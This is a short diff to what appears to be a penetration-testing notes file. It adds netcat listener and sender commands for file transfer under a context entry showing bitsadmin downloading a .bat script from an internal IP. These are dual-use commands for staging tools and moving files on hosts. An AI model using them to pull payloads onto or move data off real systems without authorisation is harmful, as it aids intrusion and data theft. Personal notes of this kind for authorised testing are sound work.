@@ -45,6 +45,17 @@ BITSADMIN
 	(try to host local file on apache server instead of python --> some issues)
 	bitsadmin.exe /transfer n http://10.11.0.154/wmic_info.bat c:\HFS\wmic_info.bat
 	
+NETCAT for File Transfer
+	On the receiving end running,
+
+	nc -l -p 1234 > out.file
+	will begin listening on port 1234.
+
+	On the sending end running,
+
+	nc -w 3 [destination] 1234 < out.file
+	will connect to the receiver and begin sending file.
+	
 	
 		
 		
